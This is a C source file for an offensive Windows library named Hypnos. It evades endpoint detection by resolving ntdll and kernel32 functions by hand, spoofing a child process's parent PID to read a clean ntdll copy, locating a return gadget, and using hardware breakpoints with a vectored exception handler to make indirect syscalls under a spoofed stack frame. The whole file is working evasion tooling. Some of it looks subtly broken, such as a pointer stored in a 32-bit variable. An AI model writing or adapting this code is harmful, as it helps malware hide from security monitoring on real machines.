#include <stdlib.h>

#include "includes/hypnos.h"
#include "includes/Native.h"

#pragma region GlobalVariables

HANDLE mainThread;
HANDLE hNtdllCopy;
HANDLE hExceptionHandler;
DWORD_PTR retGadgetAddress;
DWORD ntFunctionAddress;

#pragma endregion

#pragma region PatternMatching

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
{
    DWORD_PTR dwAddress = 0;
    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName);

    if (!imageBase)
        return 0;

    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase + imageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sectionOffset)
        return 0;

    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset);
    dwAddress = FindPattern((DWORD_PTR)imageBase + textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask);
    return dwAddress;
}

#pragma endregion

BOOL IsHooked(LPVOID symbolAddr) {
    unsigned char stub[] = {0x4c, 0x8b, 0xd1, 0xb8}; // Syscall stub opcodes
    return FindPattern(symbolAddr, 4, (PBYTE)stub, (PCHAR)"xxxx");
}

#pragma region PebParsing

unsigned long djb2_hash(const char* str) {
    unsigned long hash = 5381;
    int c;

    while ((c = *str++))
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

    return hash;
}

UINT64 GetModuleAddress(LPWSTR moduleName) {
    PPEB peb = (PPEB)__readgsqword(X64_PEB_OFFSET);
    LIST_ENTRY* ModuleList = NULL;

    if (!moduleName)
        return 0;

    for (LIST_ENTRY* pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
         pListEntry != &peb->Ldr->InMemoryOrderModuleList;
         pListEntry = pListEntry->Flink)
    {

        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (wcsstr(pEntry->FullDllName.Buffer, moduleName)) {
            return (UINT64)pEntry->DllBase;
        }
    }
    return 0;
}

void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory) {
    // Getting DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    // Getting NT headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dosHeader->e_lfanew);

    *ppNtdllExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
}

void* GetSymbolAddress(PVOID imageBase, char* toFind) {
    PIMAGE_EXPORT_DIRECTORY pNtdllExportDirectory;
    Hypnos_GetImageExportDirectory(imageBase, &pNtdllExportDirectory);

    PDWORD pdwFunctionNames = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNames);
    PDWORD pdwFunctionAddresses = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfFunctions);
    PWORD pwAddressOfNameOrdinals = (PWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNameOrdinals);

    // Walking over exported functions
    for (int i = 0; i < pNtdllExportDirectory->NumberOfNames; i++) {
        // Grabbing function name and function address
        char* pFunctionName = (char*)((PBYTE)imageBase + pdwFunctionNames[i]);
        void* pFunctionAddress = (PBYTE)imageBase + pdwFunctionAddresses[pwAddressOfNameOrdinals[i]];

        if (strcmp(pFunctionName, toFind) == 0) return pFunctionAddress;
    }

    return NULL;
}

DWORD PrepareSyscall(PCHAR symbolName) {
    return ntFunctionAddress;
}

#pragma endregion

DWORD FindProcess(LPCSTR name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 processentry32;
    processentry32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processentry32)) return -1;

    do {
        if (strcmp(processentry32.szExeFile, name) == 0) {
            return processentry32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &processentry32));

    return -1;
}

HANDLE SpoofProcessPPID(LPCSTR toSpawn, LPCSTR parentName) {
    DWORD parentPid = FindProcess(parentName);
    STARTUPINFOEXA startUpInfo;
    PROCESS_INFORMATION processInformation;
    SIZE_T attributeSize;
    SecureZeroMemory(&startUpInfo, sizeof(startUpInfo));
    SecureZeroMemory(&processInformation, sizeof(processInformation));

    HANDLE parentHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, parentPid);

    // Setting up attributes to spoof PPID
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    startUpInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(startUpInfo.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(startUpInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);
    startUpInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Now, we can create the child process
    BOOL res = CreateProcessA(NULL, (LPSTR)toSpawn, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                              NULL, NULL, &startUpInfo.StartupInfo, &processInformation);

    if (res) {
        printf("[+] Spoofed PPID of %s to %s at %lu\n", toSpawn, parentName, parentPid);
    }

    return processInformation.hProcess;
}

void* GetNtdllCopy() {
    // Gets a HANDLE to NTDLL via suspended process method
    HANDLE childHandle = SpoofProcessPPID("calc.exe", "explorer.exe");
    if (childHandle == INVALID_HANDLE_VALUE) {
        printf("[!] Could not create child process\n");
        return NULL;
    }

    // Parsing headers from NTDLL
    HMODULE moduleNtdll = GetModuleAddress(L"ntdll.dll");
    PIMAGE_DOS_HEADER ntdllDosHeader =(PIMAGE_DOS_HEADER)moduleNtdll;
    PIMAGE_NT_HEADERS  ntdllNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllDosHeader + (BYTE)ntdllDosHeader->e_lfanew);
    DWORD ntdllSize = ntdllNtHeaders->OptionalHeader.SizeOfImage;

    LPVOID ntdllCopy = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ntdllSize);
    if (!ReadProcessMemory(childHandle, moduleNtdll, ntdllCopy, ntdllSize, NULL)) {
        printf("[!] Could not read process memory to ntdllCopy, %d\n", GetLastError());
        return NULL;
    }

    TerminateProcess(childHandle, 0);
    return ntdllCopy;
}

WORD GetSyscallNumber(void* addr) {
    return (WORD)*((PBYTE)addr + 4);
}

BOOL FindRetGadget() {
    // Dynamically search for a suitable "ADD RSP,68;RET" gadget in both kernel32 and kernelbase
    retGadgetAddress = FindInModule("KERNEL32.DLL", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (retGadgetAddress != 0) {
        printf("[+] Found RET_GADGET in kernel32.dll: %#llx\n", retGadgetAddress);
        return TRUE;
    }

    retGadgetAddress = FindInModule("kernelbase.dll", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (retGadgetAddress != 0) {
        printf("[+] Found RET_GADGET in kernelbase.dll: %#llx\n", retGadgetAddress);
        return TRUE;
    }

    printf("[!] Could not find RET_GADGET in kernel32.dll and kernelbase.dll\n");
    return FALSE;
}

DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress) {
    DWORD64 syscallReturnAddress = 0;

    for (WORD i = 1; i <= 32; i++) {
        if (*((PBYTE)functionAddress + i) == 0x0f && *((PBYTE)functionAddress + i + 1) == 0x05) {
            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + i);
            break;
        }
    }

    if (syscallReturnAddress == 0)
        printf("[-] Could not find \"syscall;ret;\" opcode address\n");

    return syscallReturnAddress;
}

LONG HypnosExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if(ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if(ExceptionInfo->ContextRecord->Rip == (DWORD64)& PrepareSyscall) {
            printf("\n[+] ============ Hitted HWBP on PrepareSyscall! ============ \n");
            printf("[+] PrepareSyscall hit on: %#llx\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);

            // Getting symbol address, of string passed into PrepareSyscall
            ntFunctionAddress = GetSymbolAddress(hNtdllCopy, ExceptionInfo->ContextRecord->Rcx);
            printf("[+] Moving HWBP to NTAPI symbol at: %#llx\n", ntFunctionAddress);

            // Moving the breakpoint to ntFunctionAddress
            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
        } else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {
            printf("[+] Breakpoint on NTAPI symbol hit on: %#llx\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);

            // Creating the new stack, so we can spoof the kernel32 address
            ExceptionInfo->ContextRecord->Rsp -= 0x70;
            // Moving our gadget address into rsp (mov rsp, GADGET)
            *(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress;

            printf("[+] Created a new stack frame, with return address %#llx (GADGET)\n", retGadgetAddress);

            // Adding the rest of the original stack
            for (size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++)
            {
                const size_t offset = idx * STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET;
                *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset + 0x70);
            }

            printf("[+] Added rest of original stack to our spoofed stack frame\n");

            DWORD64 pFunctionAddress = (DWORD64)ExceptionInfo->ContextRecord->Rip;
            printf("[+] RIP: %#llx\n", pFunctionAddress);

            WORD syscallNumber = GetSyscallNumber(pFunctionAddress);
            printf("[+] Syscall number is: %d\n", syscallNumber);
            DWORD64 syscallRetAddress = FindSyscallReturnAddress(pFunctionAddress);

            ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
            ExceptionInfo->ContextRecord->Rax = syscallNumber;
            ExceptionInfo->ContextRecord->Rip = syscallRetAddress;

            // Placing the breakpoint back on PrepareSyscall for next iteration.
            ExceptionInfo->ContextRecord->Dr0 = (DWORD64)&PrepareSyscall;
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL InitMainBreakpoint() {
    // Get GetThreadContext and SetThreadContext dynamically
    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetSymbolAddress(GetModuleAddress(L"KERNEL32.DLL"), "GetThreadContext");
    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetSymbolAddress(GetModuleAddress(L"KERNEL32.DLL"), "SetThreadContext");

    // Getting the current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    pGetThreadContext(mainThread, &ctx);

    // Setting the hardware breakpoint
    ctx.Dr0 = (UINT64)&PrepareSyscall;
    ctx.Dr7 |= (1 << 0);
    ctx.Dr7 &= ~(1 << 16);
    ctx.Dr7 &= ~(1 << 17);
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Setting the new thread context
    if (!pSetThreadContext(mainThread, &ctx)) {
        printf("[!] Couldn't apply hardware breakpoint\n");
        return FALSE;
    }

    printf("[+] Hardware breakpoint set successfully!\n");
    return TRUE;
}

BOOL InitHypnos() {
    // Getting current thread, and handle to clean copy of NTDLL
    mainThread = GetCurrentThread();
    hNtdllCopy = GetModuleAddress(L"ntdll.dll");

    // Looking for a return gadget in KERNEL32 and KERNELBASE
    if (!FindRetGadget()) return FALSE;

    // Initialize VEH
    hExceptionHandler = AddVectoredExceptionHandler(1, &HypnosExceptionHandler);
    if (!hExceptionHandler) {
        printf("[!] Could not set VEH\n");
        return FALSE;
    }

    // Set the main breakpoint on PrepareSyscall :D
    return InitMainBreakpoint();
}

